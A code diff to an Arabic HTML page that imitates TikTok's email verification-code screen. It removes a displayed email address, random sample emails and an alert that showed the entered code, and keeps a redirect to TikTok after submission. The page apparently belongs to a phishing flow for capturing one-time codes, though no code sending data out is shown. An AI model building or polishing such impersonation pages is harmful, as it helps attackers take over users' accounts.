@@ -87,29 +87,6 @@
             font-size: 16px;
         }
         
-        .email-display {
-            background-color: #f8f9fa;
-            border-radius: 10px;
-            padding: 15px;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #e9ecef;
-        }
-        
-        .email-display .label {
-            font-size: 14px;
-            color: #6c757d;
-            margin-bottom: 5px;
-        }
-        
-        .email-display .email {
-            font-weight: bold;
-            color: #495057;
-            direction: ltr;
-            font-size: 16px;
-            word-break: break-all;
-        }
-        
         .otp-form {
             display: flex;
             flex-direction: column;
@@ -289,10 +266,6 @@
             .buttons {
                 flex-direction: column;
             }
-            
-            .email-display .email {
-                font-size: 14px;
-            }
         }
     </style>
 </head>
@@ -309,13 +282,6 @@
         <div class="content">
             <div class="instruction">
                 لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى بريدك الإلكتروني المسجل. يرجى إدخال الرمز أدناه للتحقق من هويتك والوصول إلى حساب TikTok الخاص بك.
-            </div>
-            
-            <div class="email-display">
-                <div class="label">
-                    <i class="fas fa-envelope email-icon"></i> تم الإرسال إلى:
-                </div>
-                <div class="email" id="emailDisplay">user@example.com</div>
             </div>
             
             <form class="otp-form" id="otpForm">
@@ -365,24 +331,8 @@
         const resendLink = document.getElementById('resendLink');
         const timerElement = document.getElementById('time');
         const resendTimeElement = document.getElementById('resendTime');
-        const emailDisplay = document.getElementById('emailDisplay');
         const redirectMessage = document.getElementById('redirectMessage');
         const redirectCountdown = document.getElementById('redirectCountdown');
-        
-        const sampleEmails = [
-            "user123@example.com",
-            "ahmed.mohamed@domain.com",
-            "sara.ali@company.org",
-            "client.service@business.net"
-        ];
-        
-        const savedUsername = localStorage.getItem('tiktok_username');
-        if (savedUsername) {
-            emailDisplay.textContent = savedUsername;
-        } else {
-            const randomEmail = sampleEmails[Math.floor(Math.random() * sampleEmails.length)];
-            emailDisplay.textContent = randomEmail;
-        }
         
         otpDigits.forEach((digit, index) => {
             digit.addEventListener('input', (e) => {
@@ -482,12 +432,9 @@
             
             submitBtn.disabled = true;
             
-            const newRandomEmail = sampleEmails[Math.floor(Math.random() * sampleEmails.length)];
-            emailDisplay.textContent = newRandomEmail;
-            
             otpDigits[0].focus();
             
-            alert(`تم إرسال رمز التحقق الجديد بنجاح إلى ${newRandomEmail}!`);
+            alert('تم إرسال رمز التحقق الجديد بنجاح!');
         });
         
         resendLink.addEventListener('click', function() {
@@ -536,6 +483,7 @@
                 return;
             }
             
+            // تم حذف رسالة التنبيه التي كانت تظهر تفاصيل البريد ورمز التحقق
             
             redirectToTikTok();
         });
@@ -545,5 +493,4 @@
         });
     </script>
 </body>
-
 </html>
